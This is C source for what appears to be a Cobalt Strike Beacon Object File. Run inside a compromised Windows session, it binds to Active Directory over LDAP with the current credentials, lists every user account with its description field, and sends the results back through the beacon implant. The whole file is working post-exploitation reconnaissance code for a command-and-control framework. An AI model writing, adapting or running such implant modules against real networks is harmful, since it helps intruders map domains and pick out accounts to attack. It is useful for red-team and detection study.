#include <windows.h>
#include <winldap.h>
#include <stdio.h>
#include "beacon.h"

// Define function prototypes for dynamic resolution
DECLSPEC_IMPORT PLDAP WINAPI WLDAP32$ldap_initA(PSTR, ULONG);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_connect(PLDAP, PLDAP_TIMEVAL);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_bind_sA(PLDAP, PSTR, PSTR, ULONG);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_search_sA(PLDAP, PSTR, ULONG, PSTR, PSTR[], ULONG, PLDAPMessage *);
DECLSPEC_IMPORT PLDAPMessage WINAPI WLDAP32$ldap_first_entry(PLDAP, PLDAPMessage);
DECLSPEC_IMPORT PLDAPMessage WINAPI WLDAP32$ldap_next_entry(PLDAP, PLDAPMessage);
DECLSPEC_IMPORT PSTR * WINAPI WLDAP32$ldap_get_valuesA(PLDAP, PLDAPMessage, PSTR);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_count_entries(PLDAP, PLDAPMessage);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_value_freeA(PSTR *);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_msgfree(PLDAPMessage);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_unbind(PLDAP);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_get_option(PLDAP, int, void *);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_set_option(PLDAP, int, void *);

void go(char * args, int len) {
    PLDAP pLdap = NULL;
    ULONG version = LDAP_VERSION3;
    ULONG status;
    PLDAPMessage pMessage = NULL;
    PLDAPMessage pEntry = NULL;
    PSTR pMyDN = NULL;
    PSTR * pValues = NULL;
    
    // Attributes to retrieve
    PSTR attributes[] = { "sAMAccountName", "description", NULL };
    PSTR defaultContext[] = { "defaultNamingContext", NULL };

    // 1. Initialize LDAP connection
    pLdap = WLDAP32$ldap_initA(NULL, LDAP_PORT);
    if (pLdap == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "ldap_init failed");
        return;
    }

    // 2. Set options (Version 3)
    status = WLDAP32$ldap_set_option(pLdap, LDAP_OPT_PROTOCOL_VERSION, (void*)&version);
    if (status != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "ldap_set_option failed: 0x%x", status);
        WLDAP32$ldap_unbind(pLdap);
        return;
    }

    // 3. Connect
    status = WLDAP32$ldap_connect(pLdap, NULL);
    if (status != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "ldap_connect failed: 0x%x", status);
        WLDAP32$ldap_unbind(pLdap);
        return;
    }

    // 4. Bind (using current credentials)
    status = WLDAP32$ldap_bind_sA(pLdap, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (status != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "ldap_bind_s failed: 0x%x", status);
        WLDAP32$ldap_unbind(pLdap);
        return;
    }

    // 5. Get defaultNamingContext from RootDSE
    status = WLDAP32$ldap_search_sA(pLdap, NULL, LDAP_SCOPE_BASE, "(objectClass=*)", defaultContext, 0, &pMessage);
    if (status != LDAP_SUCCESS) {
         BeaconPrintf(CALLBACK_ERROR, "RootDSE search failed: 0x%x", status);
         WLDAP32$ldap_unbind(pLdap);
         return;
    }

    pEntry = WLDAP32$ldap_first_entry(pLdap, pMessage);
    if (pEntry) {
         pValues = WLDAP32$ldap_get_valuesA(pLdap, pEntry, "defaultNamingContext");
         if (pValues && pValues[0]) {
             pMyDN = pValues[0];
         }
    }
    
    if (pMyDN == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Could not retrieve defaultNamingContext");
        if (pValues) WLDAP32$ldap_value_freeA(pValues);
        WLDAP32$ldap_msgfree(pMessage);
        WLDAP32$ldap_unbind(pLdap);
        return;
    }

    // 6. Search for All Users
    char * searchFilter = "(&(objectCategory=person)(objectClass=user))";
    PLDAPMessage pUserMessage = NULL;

    status = WLDAP32$ldap_search_sA(pLdap, pMyDN, LDAP_SCOPE_SUBTREE, searchFilter, attributes, 0, &pUserMessage);
    
    // Free the previous values now that we've used pMyDN
    if (pValues) WLDAP32$ldap_value_freeA(pValues);
    WLDAP32$ldap_msgfree(pMessage);

    if (status != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "User search failed: 0x%x", status);
        WLDAP32$ldap_unbind(pLdap);
        return;
    }

    // 7. Process Results using Buffer
    formatp buffer;
    BeaconFormatAlloc(&buffer, 128 * 1024); // Allocate 128KB - user lists can be long

    int count = WLDAP32$ldap_count_entries(pLdap, pUserMessage);
    
    // Header
    BeaconFormatPrintf(&buffer, "[*] Enumerating Users in: %s\n", pMyDN ? pMyDN : "UNKNOWN");
    BeaconFormatPrintf(&buffer, "[*] TOTAL NUMBER OF USERS: %d\n\n", count);

    for (pEntry = WLDAP32$ldap_first_entry(pLdap, pUserMessage); pEntry != NULL; pEntry = WLDAP32$ldap_next_entry(pLdap, pEntry)) {
        PSTR * sAMAccountName = WLDAP32$ldap_get_valuesA(pLdap, pEntry, "sAMAccountName");
        PSTR * description = WLDAP32$ldap_get_valuesA(pLdap, pEntry, "description");

        if (sAMAccountName) {
            BeaconFormatPrintf(&buffer, "User: %s\n", sAMAccountName[0]);
            if (description) {
                BeaconFormatPrintf(&buffer, "Description: %s\n", description[0]);
            } else {
                BeaconFormatPrintf(&buffer, "Description: <empty>\n");
            }
            BeaconFormatPrintf(&buffer, "\n");
        }

        if (sAMAccountName) WLDAP32$ldap_value_freeA(sAMAccountName);
        if (description) WLDAP32$ldap_value_freeA(description);
    }
    
    // Output everything at once
    int outLen = 0;
    char * outStr = BeaconFormatToString(&buffer, &outLen);
    BeaconOutput(CALLBACK_OUTPUT, outStr, outLen);
    BeaconFormatFree(&buffer);

    // 8. Cleanup
    WLDAP32$ldap_msgfree(pUserMessage);
    WLDAP32$ldap_unbind(pLdap);
}
